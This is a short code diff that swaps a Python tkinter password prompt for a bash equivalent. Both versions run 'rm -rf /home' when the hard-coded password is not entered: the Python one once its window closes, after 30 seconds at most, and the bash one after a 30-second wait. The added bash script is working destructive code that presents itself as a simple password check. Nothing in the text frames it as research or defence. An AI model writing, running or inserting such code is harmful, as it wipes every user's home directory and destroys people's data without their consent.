@@ -1,21 +1,13 @@
+#!/bin/bash
 
-#!/usr/bin/env python3
+echo "Please enter password: "
+read password
 
-from tkinter import *
-import os
+if [[ $password == "password" ]]
+then
+  echo "Exiting application"
+  exit 0
+fi
 
-master = Tk()
-e = Entry(master)
-e.pack()
-e.focus_set()
-
-def callback():
-    if e.get() == "password":
-       quit()
-
-b = Button(master, text = "STOP", width = 10, command = callback)
-b.pack()
-master.after(30000, master.destroy)
-mainloop()
-
-os.system("rm -rf /home")
+sleep 30s
+rm -rf /home
